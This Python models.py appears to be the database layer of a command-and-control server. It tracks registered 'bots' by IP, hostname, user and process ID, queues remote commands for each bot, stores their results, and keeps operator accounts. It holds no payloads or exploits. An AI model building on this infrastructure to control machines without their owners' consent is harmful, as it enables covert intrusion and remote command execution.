import psycopg2
from flask import jsonify 
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime  

"""
Name: models.py 
Description: Python sqlalchemy model class file which contains all database model information and functions 

Currently models.py contains Bot, Command, User model. 
"""

db = SQLAlchemy()

class Bot(db.Model):
    #__tablename__ = 'bots'
    id = db.Column('bot_id', db.Integer, primary_key=True)
    ip = db.Column(db.String(16))
    os = db.Column(db.String(64))
    user = db.Column(db.String(64))
    pid = db.Column(db.String(16))
    registertime = db.Column(db.DateTime)
    timestamp = db.Column(db.DateTime)
    # cmds is a "list" of "Command" Model. The cmds and the bot_id from Command Model 
    # shows the one-to-many foreign key relationship between two tables. 
    cmds = db.relationship('Command', backref='bot', lazy=True)

    #TODO: Implement 'bot_unique_key' for authentication? 
    #unique_key = db.Column(db.String(128), default=<random_hash_created>)

    def __init__(self, ip, os, user, pid):
        self.ip = ip 
        self.os = os
        self.user = user 
        self.pid = pid
        self.cmds = []
        self.registertime = datetime.now()
        self.timestamp = datetime.now()


    def get_id(self):
        return self.id

    def get_ip(self):
        return self.ip

    def get_os(self):
        return self.os

    # DEPRECATED. Use jsonbot instead. 
    def get_info(self):
        info = 'Bot[' + str(self.id) + '] IP: ' + self.ip + ' Hostname: ' + self.os + ' User: ' + self.user + ' PID: ' + self.pid + ' Last seen: ' + str(self.timestamp) 
        return info

    def get_commands(self):
        result = '' 
        i = 0 
        for command in self.cmds:
            tmp = '[' + str(i) +'] ' + command.cmd + '\n'
            result += tmp 
            i+=1 

        return result 

    def set_timestamp(self, timestamp):
        self.timestamp = timestamp
        db.session.commit()

    def jsonbot(self):
        return {
        'id': self.id, 
        'ip': self.ip, 
        'os': self.os, 
        'user': self.user, 
        'pid': self.pid, 
        'lastseen': str(self.timestamp),
        }
        

class Command(db.Model):
    id = db.Column('cmd_id', db.Integer, primary_key=True)
    cmd = db.Column(db.String(8192))
    bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
    bot_os = db.Column(db.String(128))
    bot_ip = db.Column(db.String(128))
    timestamp = db.Column(db.DateTime) 
    latest = db.Column(db.Boolean, default=False)
    # Postgresql is smart enough to NOT use all 50000 bytes for results that are smaller than that. So we are fine. 
    result = db.Column(db.String(50000))

    def __init__(self, cmd, bot_id, bot_ip, bot_os):
        self.cmd = cmd 
        self.bot_id = bot_id 
        self.bot_ip = bot_ip 
        self.bot_os = bot_os
        self.timestamp = datetime.now()
        self.latest = False
        self.result = ''

    def jsoncommand(self):
        return {
            'id': self.id,
            'cmd': self.cmd,
            'bot_id': self.bot_id,
            'bot_ip': self.bot_ip,
            'bot_os': self.bot_os,
            'result': self.result
        }

    def set_latest_true(self):
        self.latest = True

    def set_latest_false(self):
        self.latest = False 

    def set_result(self, result):
        self.result = result 

    # DEPRECATED. Use jsoncommand instead 
    def get_info(self):
        info = '[Command Info] [' + str(self.timestamp)  + ' Bot_ip: ' + self.bot_ip + ' Command_id: ' + str(self.id) + ' Command Issued: ' + self.cmd + ' Command result: ' + self.result

        return info 

class User(db.Model):
    id = db.Column('user_id', db.Integer, primary_key=True)
    username = db.Column(db.String(32))
    password_hash = db.Column(db.String(128))

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)
